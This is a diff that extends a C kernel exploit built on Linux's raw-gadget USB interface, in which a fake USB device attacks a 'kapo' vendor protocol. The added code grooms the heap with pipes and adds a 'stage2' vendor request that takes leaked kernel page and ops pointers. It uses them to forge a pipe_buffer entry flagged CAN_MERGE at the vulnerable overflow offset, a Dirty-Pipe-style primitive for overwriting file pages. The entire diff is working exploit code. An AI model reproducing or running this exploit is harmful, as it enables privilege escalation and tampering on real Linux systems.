@@ -16,7 +16,8 @@
 #define PIPE_CONFIG_LENGTH 1024
 #define SEQ_CONFIG_LENGTH 32
 #define PIPE_COUNT 128
-#define HELPER_PIPE_COUNT 256
+#define HELPER_PIPE_COUNT 400
+#define HELPER_CONFIG_COUNT 8
 #define SEQ_COUNT 256
 #define PIPE_RING_SIZE 16
 #define PAGE_SIZE 4096
@@ -24,6 +25,16 @@
 #define RECORD_COUNT 128
 #define RECORD_SIZE 16
 #define KAPO_REQUEST_RECORD_COUNT 0x5a
+#define KAPO_REQUEST_TRANSFER_CONTEXT 0x5b
+#define VULNERABLE_PREFIX_SIZE 1024
+#define PIPE_BUFFER_PAGE 0
+#define PIPE_BUFFER_OFFSET 8
+#define PIPE_BUFFER_LEN 12
+#define PIPE_BUFFER_OPS 16
+#define PIPE_BUFFER_FLAGS 24
+#define PIPE_BUFFER_PRIVATE 32
+#define PIPE_BUF_FLAG_CAN_MERGE 0x10
+#define TRANSFER_CONTEXT_SIZE 24
 #define SHORT_CONFIGURATION_LENGTH (USB_DT_CONFIG_SIZE + \
 	USB_DT_INTERFACE_SIZE + USB_DT_ENDPOINT_SIZE)
 #define IO_DATA_LENGTH PIPE_CONFIG_LENGTH
@@ -38,7 +49,7 @@ struct control_io {
 	uint8_t data[IO_DATA_LENGTH];
 };
 
-static const struct usb_device_descriptor device_descriptor = {
+static struct usb_device_descriptor device_descriptor = {
 	.bLength = USB_DT_DEVICE_SIZE,
 	.bDescriptorType = USB_DT_DEVICE,
 	.bcdUSB = __constant_cpu_to_le16(0x0200),
@@ -80,6 +91,7 @@ static struct {
 
 static int bulk_in_endpoint;
 static uint8_t record_payload[RECORD_COUNT * RECORD_SIZE];
+static int payload_from_file;
 
 static void fail(const char *operation)
 {
@@ -144,10 +156,12 @@ static void groom_helper_page_buffers(const char *path)
 			fail("helper pipe grooming");
 		if (write(pipes[i][1], page, sizeof(page)) != sizeof(page))
 			fail("helper pipe grooming");
+		if (write(pipes[i][1], page, sizeof(page)) != sizeof(page))
+			fail("helper pipe grooming");
 		if (splice(source, &offset, pipes[i][1], NULL, 1, 0) != 1)
 			fail("helper pipe grooming");
 	}
-	for (i = HELPER_PIPE_COUNT - 1; i >= 0; i--) {
+	for (i = 1; i < HELPER_PIPE_COUNT; i += 2) {
 		close(pipes[i][0]);
 		close(pipes[i][1]);
 	}
@@ -191,6 +205,62 @@ static void acknowledge_out(int fd)
 		fail("USB_RAW_IOCTL_EP0_READ");
 }
 
+static uint32_t get_le32(const uint8_t *at)
+{
+	uint32_t value;
+
+	memcpy(&value, at, sizeof(value));
+	return le32toh(value);
+}
+
+static uint64_t get_le64(const uint8_t *at)
+{
+	uint64_t value;
+
+	memcpy(&value, at, sizeof(value));
+	return le64toh(value);
+}
+
+static void receive_transfer_context(int fd, uint16_t requested_length)
+{
+	struct control_io transfer = { .io.ep = 0 };
+	uint8_t *entry = record_payload + VULNERABLE_PREFIX_SIZE;
+	uint64_t page, ops;
+	uint32_t offset, reserved;
+
+	if (requested_length != TRANSFER_CONTEXT_SIZE) {
+		fprintf(stderr, "transfer context: expected %d bytes, got %u\n",
+			TRANSFER_CONTEXT_SIZE, requested_length);
+		exit(EXIT_FAILURE);
+	}
+	transfer.io.length = requested_length;
+	if (ioctl(fd, USB_RAW_IOCTL_EP0_READ, &transfer) < 0)
+		fail("read transfer context");
+	page = get_le64(transfer.data);
+	ops = get_le64(transfer.data + 8);
+	offset = get_le32(transfer.data + 16);
+	reserved = get_le32(transfer.data + 20);
+	if (!page || !ops || offset > PAGE_SIZE - 2 || reserved) {
+		fprintf(stderr, "transfer context: invalid fields\n");
+		exit(EXIT_FAILURE);
+	}
+	if (payload_from_file)
+		return;
+	memset(record_payload, 0, sizeof(record_payload));
+	memcpy(entry + PIPE_BUFFER_PAGE, transfer.data, sizeof(page));
+	memcpy(entry + PIPE_BUFFER_OFFSET, transfer.data + 16, sizeof(offset));
+	{
+		const uint32_t length = htole32(1);
+		const uint32_t flags = htole32(PIPE_BUF_FLAG_CAN_MERGE);
+		const uint64_t private = 0;
+
+		memcpy(entry + PIPE_BUFFER_LEN, &length, sizeof(length));
+		memcpy(entry + PIPE_BUFFER_OPS, transfer.data + 8, sizeof(ops));
+		memcpy(entry + PIPE_BUFFER_FLAGS, &flags, sizeof(flags));
+		memcpy(entry + PIPE_BUFFER_PRIVATE, &private, sizeof(private));
+	}
+}
+
 static void *send_records(void *argument)
 {
 	struct {
@@ -220,6 +290,7 @@ int main(int argc, char **argv)
 	const char *payload_path = NULL;
 	const char *helper_path = NULL;
 	int seq_mode = 0;
+	int stage2_mode = 0;
 	int fd;
 
 	if (argc > 1 && !strcmp(argv[1], "seq")) {
@@ -232,8 +303,11 @@ int main(int argc, char **argv)
 		if (argc < 3 || argc > 4)
 			goto usage;
 		helper_path = argv[2];
+		device_descriptor.bNumConfigurations = HELPER_CONFIG_COUNT;
 		if (argc == 4)
 			payload_path = argv[3];
+	} else if (argc == 2 && !strcmp(argv[1], "stage2")) {
+		stage2_mode = 1;
 	} else if (argc == 2) {
 		payload_path = argv[1];
 	} else if (argc > 2) {
@@ -242,6 +316,7 @@ int main(int argc, char **argv)
 	memset(record_payload, 'A', sizeof(record_payload));
 	if (payload_path)
 		load_record_payload(payload_path);
+	payload_from_file = payload_path != NULL;
 
 	strcpy((char *)init.driver_name, "dummy_udc");
 	strcpy((char *)init.device_name, "dummy_udc.0");
@@ -254,7 +329,7 @@ int main(int argc, char **argv)
 		groom_seq_operations();
 	} else if (helper_path) {
 		groom_helper_page_buffers(helper_path);
-	} else {
+	} else if (!stage2_mode) {
 		groom_pipe_buffers();
 	}
 	if (ioctl(fd, USB_RAW_IOCTL_INIT, &init) < 0)
@@ -279,11 +354,11 @@ int main(int argc, char **argv)
 			reply(fd, &device_descriptor, sizeof(device_descriptor), length);
 		} else if (event.control.bRequest == USB_REQ_GET_DESCRIPTOR &&
 			   (value >> 8) == USB_DT_CONFIG) {
-			reply(fd, &short_configuration, SHORT_CONFIGURATION_LENGTH,
-			      length);
-		} else if (event.control.bRequest == USB_REQ_SET_CONFIGURATION) {
-			pthread_t thread;
+			__typeof__(short_configuration) response = short_configuration;
 
+			response.configuration.bConfigurationValue = (value & 0xff) + 1;
+			reply(fd, &response, SHORT_CONFIGURATION_LENGTH, length);
+		} else if (event.control.bRequest == USB_REQ_SET_CONFIGURATION) {
 			bulk_in_endpoint = ioctl(fd, USB_RAW_IOCTL_EP_ENABLE,
 						 &short_configuration.endpoint);
 			if (bulk_in_endpoint < 0)
@@ -291,16 +366,22 @@ int main(int argc, char **argv)
 			if (ioctl(fd, USB_RAW_IOCTL_CONFIGURE) < 0)
 				fail("USB_RAW_IOCTL_CONFIGURE");
 			acknowledge_out(fd);
-			if (pthread_create(&thread, NULL, send_records,
-					   (void *)(intptr_t)fd))
-				fail("pthread_create");
-			pthread_detach(thread);
+		} else if ((event.control.bRequestType & USB_TYPE_MASK) ==
+			   USB_TYPE_VENDOR &&
+			   (event.control.bRequestType & USB_DIR_IN) == USB_DIR_OUT &&
+			   event.control.bRequest == KAPO_REQUEST_TRANSFER_CONTEXT) {
+			receive_transfer_context(fd, length);
 		} else if ((event.control.bRequestType & USB_TYPE_MASK) ==
 			   USB_TYPE_VENDOR &&
 			   event.control.bRequest == KAPO_REQUEST_RECORD_COUNT) {
 			const uint16_t count = htole16(RECORD_COUNT);
+			pthread_t thread;
 
 			reply(fd, &count, sizeof(count), length);
+			if (pthread_create(&thread, NULL, send_records,
+					   (void *)(intptr_t)fd))
+				fail("pthread_create");
+			pthread_detach(thread);
 		} else {
 			if (ioctl(fd, USB_RAW_IOCTL_EP0_STALL) < 0 && errno != EBUSY)
 				fail("USB_RAW_IOCTL_EP0_STALL");
@@ -309,7 +390,7 @@ int main(int argc, char **argv)
 
 usage:
 	fprintf(stderr,
-		"usage: %s [seq [payload-file]|helper <file> [payload-file]|payload-file]\n",
+		"usage: %s [seq [payload-file]|helper <file> [payload-file]|stage2|payload-file]\n",
 		argv[0]);
 	return EXIT_FAILURE;
 }
